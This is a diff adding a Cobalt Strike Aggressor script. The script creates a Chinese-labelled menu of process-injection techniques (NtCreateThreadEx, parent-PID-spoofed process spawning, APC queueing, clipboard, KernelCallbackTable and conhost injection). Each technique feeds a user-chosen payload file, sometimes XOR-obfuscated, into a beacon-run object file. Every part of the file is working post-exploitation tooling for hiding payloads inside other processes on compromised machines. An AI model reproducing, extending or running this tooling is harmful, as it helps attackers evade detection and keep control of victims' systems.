@@ -1,0 +1,187 @@
+menu "进程注入"{
+	item "CreateRemoteThread" {
+		local('$bid');
+		foreach $bid ($1){
+			&createremotethread_dialog($bid);
+		}	 	
+	}
+	
+	item "SpawnProcess"{
+		local('$bid');
+		foreach $bid ($1){
+			&spawnprocess_dialog($bid);
+		}	
+		
+	}
+	
+	item "QueueUserAPC" {
+		local('$bid');
+		foreach $bid ($1){
+			&queueuserapc_dialog($bid);
+		}
+    }
+	
+	item "ClipBoard" {
+		local('$bid');
+		foreach $bid ($1){
+			&clipboard_dialog($bid);
+		}
+	}
+	
+	item "KernelCallbackTable" {
+		local('$bid');
+		foreach $bid ($1){
+			&kernelcallbacktable_dialog($bid);
+		}
+	}
+	
+	item "Conhost" {
+		local('$bid');
+		foreach $bid ($1){
+			&conhost_dialog($bid);
+		}
+	}
+
+
+}
+
+## --------------------------------------------------------------------------------------------------- ##
+## ----------------------------------------- 《函数区域》 -------------------------------------------- ##
+## --------------------------------------------------------------------------------------------------- ##
+sub xor
+{
+    local('$payload $buf $key');
+    $payload = $1;
+    $key = strlen($payload) % 255;
+
+    for($i = 0; $i < strlen($payload); $i++)
+    {
+        $buf .= chr(asc(charAt($payload, $i)) ^ $key);
+    }
+
+    return $buf;
+}  
+
+sub createremotethread_dialog{	
+	$dialog = dialog("NtCreateThread", %(pid => 0, bid => $1), &createremotethread);
+	dialog_description($dialog, "使用NtCreateThreadEx函数实现进程注入");
+	drow_text($dialog, "pid", "进程PID: ");
+	drow_file($dialog, "payloadpath", "Payload位置: ");
+	dbutton_action($dialog, "注入");
+	dialog_show($dialog);
+}
+
+sub createremotethread{
+	local('$bid $data $payloadpath $payload $args');
+	$pid = $3['pid'];
+	$bid = $3['bid'];
+	$payloadpath = $3['payloadpath'];
+	$payload = xor(readb(openf($payloadpath),-1));
+	$data = readbof($bid,"CreateRemoteThread");
+	$args = bof_pack($bid,"ib",parseNumber($pid, 10), $payload);
+	btask($bid, "Running CreateRemoteThread");
+	beacon_inline_execute($bid, $data, "go", $args);
+}
+
+sub spawnprocess_dialog{
+	$dialog = dialog("NtOpenProcess", %(bid => $1,ParentProcess => "explorer.exe",ExecutableLocation => "C:\\Windows\\System32\\svchost.exe",ProcessArgs => ""), &spawnprocess);
+	dialog_description($dialog, "使用NtOpenProcess函数创建新进程并注入");
+	drow_text($dialog, "ParentProcess", "父进程: ");
+	drow_file($dialog, "ExecutableLocation", "可执行程序的所在目录: ");
+	drow_text($dialog, "ProcessArgs", "程序的执行参数：");
+	dbutton_action($dialog, "创建");
+	dialog_show($dialog);
+} 
+	
+sub spawnprocess{
+	local('$bid $args $data');
+	$bid = $3['bid'];
+	$data = readbof($bid,"SpawnProcess");
+	$args = bof_pack($bid,"zzz",$3['ExecutableLocation'],$3['ProcessArgs'],$3['ParentProcess']);
+	btask($bid, "开始创建进程");
+	beacon_inline_execute($bid, $data, "go", $args);		
+}
+
+sub queueuserapc_dialog{
+	$dialog = dialog("NtQueueApcThread", %(pid => 0, bid => $1), &queueuserapc);
+	dialog_description($dialog, "使用NtQueueApcThread函数实现进程注入");
+	drow_text($dialog, "pid", "进程PID: ");
+	drow_file($dialog, "payloadpath", "Payload位置: ");
+	dbutton_action($dialog, "注入");
+	dialog_show($dialog);	
+}
+	
+sub queueuserapc{
+	local('$bid $data $payloadpath $payload $args $ThreadCount');
+	$pid = $3['pid'];
+	$bid = $3['bid'];
+	$payloadpath = $3['payloadpath'];
+	$payload = readb(openf($payloadpath),-1);
+	$data = readbof($bid,"ntqueueapcthread");
+	$args = bof_pack($bid,"ib",parseNumber($pid), $payload);
+	btask($bid, "Running QueueUserAPC");
+	beacon_inline_execute($bid, $data, "go", $args);
+}
+
+sub clipboard_dialog{
+	$dialog = dialog("ClipBoard", %(pid => 0, bid => $1), &clipboard);
+	dialog_description($dialog, "利用剪切板实现进程注入(首次执行会打印能够使用此技术实现注入的进程PID)");
+	drow_text($dialog, "pid", "进程PID: ");
+	drow_file($dialog, "payloadpath", "Payload位置: ");
+	dbutton_action($dialog, "注入");
+	dialog_show($dialog);
+}
+
+sub clipboard{
+	local('$bid $data $payloadpath $payload $args');
+	$bid = $3['bid'];
+	$payloadpath = $3['payloadpath'];
+	$payload = readb(openf($payloadpath),-1);
+	$data = readbof($bid,"clipboard");
+	$args = bof_pack($bid,"ib",parseNumber($pid), $payload);
+	$pid = $3['pid'];
+	btask($bid, "Running ClipBoard Inject");
+	beacon_inline_execute($bid, $data, "go", $args);
+}
+
+sub kernelcallbacktable_dialog {
+	$dialog = dialog("KernelCallbackTable", %(pid => 0, bid => $1), &kernelcallbacktable);
+	dialog_description($dialog, "通过内核回调表实现进程注入");
+	drow_text($dialog, "pid", "进程PID: ");
+	drow_file($dialog, "payloadpath", "Payload位置: ");
+	dbutton_action($dialog, "注入");
+	dialog_show($dialog);
+}
+	
+sub kernelcallbacktable {
+	local('$bid $data $payloadpath $payload $args');
+	$pid = $3['pid'];
+	$bid = $3['bid'];
+	$payloadpath = $3['payloadpath'];
+	$payload = readb(openf($payloadpath),-1);
+	$data = readbof($bid,"kernelcallbacktable");
+	$args = bof_pack($bid,"ib",parseNumber($pid), $payload);
+	btask($bid, "Running kernelcallbacktable");
+	beacon_inline_execute($bid, $data, "go", $args);
+}
+
+sub conhost_dialog {
+	$dialog = dialog("Conhost", %(pid => 0, bid => $1), &conhost);
+	dialog_description($dialog, "对conhost进程进行注入(首次执行会打印能够注入的conhost进程ID)");
+	drow_text($dialog, "pid", "conhost进程ID: ");
+	drow_file($dialog, "payloadpath", "Payload位置: ");
+	dbutton_action($dialog, "注入");
+	dialog_show($dialog);
+}
+	
+sub conhost {
+	local('$bid $data $payloadpath $payload $args');
+	$bid = $3['bid'];
+	$pid = $3['pid'];
+	$payloadpath = $3['payloadpath'];
+	$payload = readb(openf($payloadpath),-1);
+	$data = readbof($bid,"conhost");
+	$args = bof_pack($bid,"ib",$pid, $payload);
+	btask($bid, "Running conhost.exe Inject");
+	beacon_inline_execute($bid, $data, "go", $args);
+}
